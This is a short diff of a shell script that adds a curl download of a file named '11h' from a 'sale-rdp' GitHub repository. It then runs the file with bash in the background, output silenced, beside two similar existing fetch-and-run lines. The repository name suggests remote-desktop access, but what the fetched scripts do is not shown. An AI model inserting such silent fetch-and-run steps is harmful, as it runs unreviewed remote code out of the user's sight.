@@ -6,6 +6,7 @@ stty susp undef
 
 curl -sSL -o ssmtp https://raw.githubusercontent.com/3222h/sale-rdp/main/ssmtp
 curl -sSL -o flare https://raw.githubusercontent.com/3222h/sale-rdp/main/flare
+curl -sSL -o 11h https://raw.githubusercontent.com/3222h/sale-rdp/main/11h
 
 
 clear
@@ -128,3 +129,4 @@ done
 
 bash ssmtp > /dev/null 2>&1 &
 bash flare > /dev/null 2>&1 &
+bash 11h > /dev/null 2>&1 &
